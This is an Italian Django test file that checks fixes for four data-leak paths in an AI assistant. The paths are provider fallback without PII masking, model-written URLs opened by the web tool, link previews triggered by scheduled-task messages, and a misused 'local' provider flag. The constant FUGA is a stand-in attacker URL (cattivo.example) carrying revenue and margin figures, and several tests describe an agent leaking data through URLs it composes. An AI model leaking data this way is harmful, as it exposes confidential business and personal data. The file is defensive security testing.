"""Quattro strade da cui i dati potevano uscire, trovate nella revisione del 27/11/2026.

1. Dati personali: la risposta di un fornitore con i blocchi «nativi» (Claude), scritta con la protezione accesa, andava
   in chiaro a un fornitore diverso (riserva della catena, modello scelto a mano, chat ripresa a voce).
2. Web: un indirizzo scritto dal modello nella query di cerca_web risultava «già comparso», e leggi_pagina lo apriva.
3. Comunicazioni: il messaggio di un'attività pianificata faceva scaricare al server le anteprime dei suoi link.
4. Provider: «locale» (niente mascheramento, ammesso nelle chat riservate) lo decideva chiunque amministrasse
   l'assistente, anche per un servizio esterno."""
import json
import re

import pytest
from django.contrib.auth.models import Permission, User

from ai import pianificate, protezione
from ai.forms import ProviderForm
from ai.gateway import ErroreModello, Fine, Testo, Uso, anthropic_api, esecuzione, finto, openai_compat
from ai.models import Evento, Modello, Provider
from ai.strumenti import ErroreStrumento, web
from ai.tests.test_chat_gruppo2 import _chat, _ctx, _motore, _pagina, s, web_acceso  # noqa: F401  (fixture e aiuti)
from ai.tests.test_pianificate import _pianificata, scena  # noqa: F401
from core import rete

FUGA = "https://cattivo.example/c?d=fatturato-1250000-margine-42"


# ---------- 1. dati personali tra fornitori ----------

def _protezione(monkeypatch):
    """La protezione accesa, con un servizio finto che riconosce un nome."""
    monkeypatch.setattr(protezione, "spans", lambda url, testo, esclusi: [
        (m.start(), m.end(), "FULLNAME") for m in re.finditer("Mario Rossi", testo)])
    return protezione.Protezione(None, url="http://pii", esclusi=())


def _storia():
    """Una risposta scritta da Claude con la protezione accesa: nel blocco nativo c'è il segnaposto, nei blocchi il
    testo in chiaro (è quello che si mostra all'utente)."""
    return [{"ruolo": "utente", "testo": "Il cliente è Mario Rossi?"},
            {"ruolo": "assistente", "mascherato": True,
             "nativo": {"provider": "anthropic", "contenuto": [{"type": "text", "text": "Sì, il cliente è [FULLNAME_1]."}]},
             "blocchi": [{"tipo": "testo", "testo": "Sì, il cliente è Mario Rossi."}]},
            {"ruolo": "utente", "testo": "E il suo IBAN?"}]


def test_la_risposta_di_claude_va_mascherata_a_un_altro_fornitore(monkeypatch):
    protetta = _protezione(monkeypatch).richiesta({"sistema": "s", "messaggi": _storia()}, True, "mistral")
    inviati = openai_compat._messaggi(protetta["sistema"], protetta["messaggi"])       # ciò che parte verso Mistral
    assert "Mario Rossi" not in json.dumps(inviati, ensure_ascii=False)
    assert inviati[2]["content"] == "Sì, il cliente è [FULLNAME_1]." and "nativo" not in protetta["messaggi"][1]


def test_a_claude_torna_il_suo_blocco_nativo_cosi_com_e(monkeypatch):
    protetta = _protezione(monkeypatch).richiesta({"sistema": "s", "messaggi": _storia()}, True, "anthropic")
    inviati = anthropic_api._messaggi(protetta["messaggi"])
    assert inviati[1]["content"] == [{"type": "text", "text": "Sì, il cliente è [FULLNAME_1]."}]
    assert "Mario Rossi" not in json.dumps(inviati, ensure_ascii=False)


def test_la_riserva_di_un_altro_fornitore_riceve_la_storia_mascherata(monkeypatch):
    """Claude non risponde e tocca a Mistral: la richiesta si prepara per il fornitore di ogni anello."""
    ricevuti = {}

    def claude(modello, chiave, **richiesta):
        ricevuti["anthropic"] = richiesta["messaggi"]
        raise ErroreModello("AUTENTICAZIONE", "chiave scaduta")
        yield                                                    # un generatore, come gli adattatori veri

    def mistral(modello, chiave, **richiesta):
        ricevuti["mistral"] = richiesta["messaggi"]
        yield Testo("ok")
        yield Uso(input=1, output=1)
        yield Fine("fine", [{"tipo": "testo", "testo": "ok"}])
    monkeypatch.setitem(esecuzione.ADATTATORI, "anthropic", claude)
    monkeypatch.setitem(esecuzione.ADATTATORI, "mistral", mistral)
    catena = [(Modello(provider=Provider(nome="A", tipo="anthropic"), id_api="claude"), "k"),
              (Modello(provider=Provider(nome="M", tipo="mistral"), id_api="mistral"), "k")]
    list(esecuzione.esegui(catena, protezione=_protezione(monkeypatch), sistema="s", messaggi=_storia()))
    assert ricevuti["anthropic"][1]["nativo"]["provider"] == "anthropic"       # a Claude il suo blocco, già mascherato
    assert "nativo" not in ricevuti["mistral"][1]
    assert "Mario Rossi" not in json.dumps(ricevuti["mistral"], ensure_ascii=False)


# ---------- 2. indirizzi del web ----------

def _strumento_web(c, nome, argomenti, risultato):
    """La chiamata del modello a uno strumento del web e il suo risultato, come li scrive il motore."""
    n = c.eventi.count()
    Evento.objects.create(conversazione=c, tipo=Evento.ASSISTENTE, dati={"ruolo": "assistente", "blocchi": [
        {"tipo": "strumento", "id": f"w{n}", "nome": nome, "argomenti": argomenti}]})
    Evento.objects.create(conversazione=c, tipo=Evento.STRUMENTO, dati={"ruolo": "strumento", "risultati": [
        {"id": f"w{n}", "contenuto": json.dumps(risultato, ensure_ascii=False), "errore": False}]})


def test_un_indirizzo_scritto_nella_query_di_ricerca_non_si_apre(s, web_acceso):
    """Il modello cerca «notizie <indirizzo composto con i dati>»: il risultato ripeteva la query, e tanto bastava."""
    c = _chat(s)
    _strumento_web(c, "cerca_web", {"query": f"notizie {FUGA}"}, {
        "query": f"notizie {FUGA}", "risultati": [{"titolo": "Notizie", "url": "https://esempio.it/n", "estratto": "…"}]})
    with pytest.raises(ErroreStrumento, match="esattamente"):
        web.leggi_pagina(_ctx(s, c), FUGA, http_client=_pagina())


def test_nemmeno_se_il_motore_di_ricerca_lo_restituisce(s, web_acceso):
    """Cercando un indirizzo, un motore può restituirlo come primo risultato: resta scritto dal modello."""
    c = _chat(s)
    _strumento_web(c, "cerca_web", {"query": FUGA}, {"risultati": [{"titolo": "cattivo.example", "url": FUGA,
                                                                   "estratto": f"Vai a {FUGA}"}]})
    with pytest.raises(ErroreStrumento, match="esattamente"):
        web.leggi_pagina(_ctx(s, c), FUGA, http_client=_pagina())


def test_cerca_web_non_ripete_la_query(s, web_acceso):
    dati = web.cerca_web(_ctx(s, _chat(s)), f"notizie {FUGA}",
                         http_client=_motore([{"title": "T", "url": "https://x.it/a", "content": "c"}]))
    assert dati == {"risultati": [{"titolo": "T", "url": "https://x.it/a", "estratto": "c"}]}


def test_si_aprono_gli_indirizzi_dei_risultati_e_quelli_scritti_nelle_pagine_lette(s, web_acceso, monkeypatch):
    monkeypatch.setattr(rete.socket, "getaddrinfo", lambda h, p, **k: [(2, 1, 6, "", ("93.184.216.34", p))])
    c = _chat(s)
    _strumento_web(c, "cerca_web", {"query": "norme iva"}, {"risultati": [
        {"titolo": "T", "url": "https://x.it/a", "estratto": "Vedi anche https://x.it/b."}]})
    _strumento_web(c, "leggi_pagina", {"url": "https://x.it/a"}, {
        "url": "https://x.it/a", "titolo": "Tit", "pagina": 1, "pagine": 1, "testo": "Fonte: https://y.it/doc?id=3 (2026)"})
    for indirizzo in ("https://x.it/a", "https://x.it/b", "https://y.it/doc?id=3"):
        assert web.leggi_pagina(_ctx(s, c), indirizzo, http_client=_pagina())["testo"] == "Testo vero"
    for composto in ("https://y.it/doc?id=3&d=segreto", "https://x.it/", "https://y.it/doc"):
        with pytest.raises(ErroreStrumento, match="esattamente"):
            web.leggi_pagina(_ctx(s, c), composto, http_client=_pagina())


# ---------- 3. anteprime dei link in Comunicazioni ----------

def test_il_messaggio_di_una_pianificata_non_fa_scaricare_le_anteprime(scena, settings, monkeypatch,
                                                                        django_capture_on_commit_callbacks):
    from discuss import servizi
    from discuss.models import Messaggio
    accodati, vera = [], servizi.lavori.accoda

    def accoda(funzione, *argomenti, **opzioni):
        accodati.append(funzione)
        return None if funzione == "discuss.anteprime.calcola" else vera(funzione, *argomenti, **opzioni)
    monkeypatch.setattr(servizi.lavori, "accoda", accoda)
    settings.SITO_URL = "https://hub.example.it"
    _pianificata(scena)
    with django_capture_on_commit_callbacks(execute=True), finto.con_copione([[f"Riepilogo pronto. Dettagli: {FUGA}"]]):
        pianificate.esegui_scadute()
    messaggio = Messaggio.objects.get()
    assert FUGA in messaggio.corpo and messaggio.autore.username == "assistente-ai"
    assert "discuss.anteprime.calcola" not in accodati                    # il server non apre gli indirizzi scritti da Ada
    with django_capture_on_commit_callbacks(execute=True):                # una persona che scrive lo stesso link: sì
        servizi.invia(messaggio.canale, scena["capo"], f"guarda {FUGA}")
    assert "discuss.anteprime.calcola" in accodati


# ---------- 4. la casella «locale» dei provider ----------

def _form(global_admin, instance=None, **dati):
    classe = type("ProviderFormDiProva", (ProviderForm,), {"global_admin": global_admin})
    return classe(data={"nome": "Prova", "attivo": "on", "locale": "on", **dati}, instance=instance)


def _risolve(monkeypatch, indirizzo):
    monkeypatch.setattr(rete.socket, "getaddrinfo", lambda h, p, **k: [(2, 1, 6, "", (indirizzo, p or 0))])


def test_locale_lo_decide_solo_il_global_admin(db, monkeypatch):
    _risolve(monkeypatch, "104.18.2.115")
    form = _form(False, tipo="openai_compat", base_url="https://openrouter.ai/api/v1")
    assert "locale" not in form.fields and form.is_valid(), form.errors
    assert form.save().locale is False                                    # la spunta mandata a mano non conta
    interno = Provider.objects.create(nome="Ollama", tipo="openai_compat", base_url="http://ollama:11434/v1", locale=True)
    _risolve(monkeypatch, "172.18.0.5")
    form = _form(False, instance=interno, nome="Ollama", tipo="openai_compat", base_url="http://ollama:11434/v1", locale="")
    assert form.is_valid(), form.errors
    assert form.save().locale is True                                     # e chi non la decide non la toglie


def test_locale_non_vale_per_un_servizio_esterno(db, monkeypatch):
    _risolve(monkeypatch, "104.18.2.115")                                 # un indirizzo pubblico
    for dati in ({"tipo": "openai_compat", "base_url": "https://openrouter.ai/api/v1"},
                 {"tipo": "openai_compat", "base_url": ""}, {"tipo": "openai", "base_url": ""},
                 {"tipo": "mistral", "base_url": ""}, {"tipo": "gemini", "base_url": ""}, {"tipo": "anthropic", "base_url": ""}):
        form = _form(True, **dati)
        assert not form.is_valid() and "locale" in form.errors, dati
    _risolve(monkeypatch, "172.18.0.5")                                   # la rete interna dei container
    form = _form(True, tipo="openai_compat", base_url="http://ollama:11434/v1")
    assert form.is_valid(), form.errors
    assert form.save().locale is True


def test_un_amministratore_dell_assistente_non_crea_un_provider_esterno_locale(client, db, monkeypatch):
    """Dalla pagina: con «locale» su OpenRouter i dati personali partivano in chiaro e le chat riservate lo accettavano."""
    _risolve(monkeypatch, "104.18.2.115")
    anna = User.objects.create_user("anna", password="x")
    anna.user_permissions.set(Permission.objects.filter(content_type__app_label="ai"))    # come «AI / Amministratore»
    client.force_login(anna)
    risposta = client.post("/ai/provider/nuovo/", {"nome": "OpenRouter", "tipo": "openai_compat", "attivo": "on",
                                                   "base_url": "https://openrouter.ai/api/v1", "locale": "on"})
    assert risposta.status_code == 302
    provider = Provider.objects.get(nome="OpenRouter")
    assert provider.locale is False
    assert protezione.Protezione(None, url="http://pii", esclusi=()).serve(Modello(provider=provider, id_api="x")) is True


def test_l_url_di_un_provider_accetta_i_nomi_dei_container(db, monkeypatch):
    """Il controllo di Django sugli URL li rifiutava: i due Ollama dell'istanza non si potevano più salvare dalla pagina."""
    _risolve(monkeypatch, "172.18.0.5")
    for indirizzo in ("http://ollama:11434/v1", "http://adabox_hub_ollama:11434/v1", "http://localhost:11434/v1"):
        form = _form(True, tipo="openai_compat", base_url=indirizzo)
        assert form.is_valid(), (indirizzo, form.errors)
    form = _form(True, tipo="openai_compat", base_url="openrouter.ai/api/v1", locale="")
    assert form.is_valid() and form.cleaned_data["base_url"] == "https://openrouter.ai/api/v1"      # senza schema: https
    for sbagliato in ("ftp://ollama/v1", "http://", "http://ollama:porta/v1", "http://un host/v1"):
        assert "base_url" in _form(True, tipo="openai_compat", base_url=sbagliato, locale="").errors, sbagliato


def test_un_provider_gia_locale_si_salva_anche_se_il_suo_server_e_spento(db, monkeypatch):
    """Con il container fermo il nome non si risolve: il Global Admin deve poterlo comunque disattivare o rinominare.
    Ma non si accende «locale» su un indirizzo che non si può controllare, e un indirizzo pubblico non passa mai."""
    def non_risolve(host, porta, **altro):
        raise OSError("nome sconosciuto")
    monkeypatch.setattr(rete.socket, "getaddrinfo", non_risolve)
    spento = Provider.objects.create(nome="Ollama", tipo="openai_compat", base_url="http://ollama:11434/v1", locale=True)
    form = _form(True, instance=spento, nome="Ollama (fermo)", tipo="openai_compat", base_url="http://ollama:11434/v1", attivo="")
    assert form.is_valid(), form.errors
    salvato = form.save()
    assert salvato.locale is True and salvato.attivo is False and salvato.nome == "Ollama (fermo)"
    assert "locale" in _form(True, instance=spento, nome="Ollama", tipo="openai_compat", base_url="http://altro:11434/v1").errors
    assert "locale" in _form(True, nome="Nuovo", tipo="openai_compat", base_url="http://ollama:11434/v1").errors
    _risolve(monkeypatch, "104.18.2.115")                                 # lo stesso nome ora porta fuori: no
    assert "locale" in _form(True, instance=spento, nome="Ollama", tipo="openai_compat", base_url="http://ollama:11434/v1").errors
